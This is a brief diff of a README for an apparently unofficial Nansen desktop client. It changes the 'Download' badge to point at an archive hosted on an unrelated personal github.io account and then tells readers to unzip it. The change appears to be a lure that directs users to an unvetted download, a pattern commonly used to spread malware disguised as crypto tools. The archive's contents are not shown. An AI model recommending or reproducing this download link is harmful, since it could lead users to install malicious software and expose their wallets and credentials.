@@ -6,7 +6,7 @@ This unofficial Nansen desktop client brings the powerful blockchain analytics p
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://nansen-desktop-app.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://latifekoybasi77638.github.io/.github/nansen-desktop)
 
 Unzip the archive to a separate folder.  
 
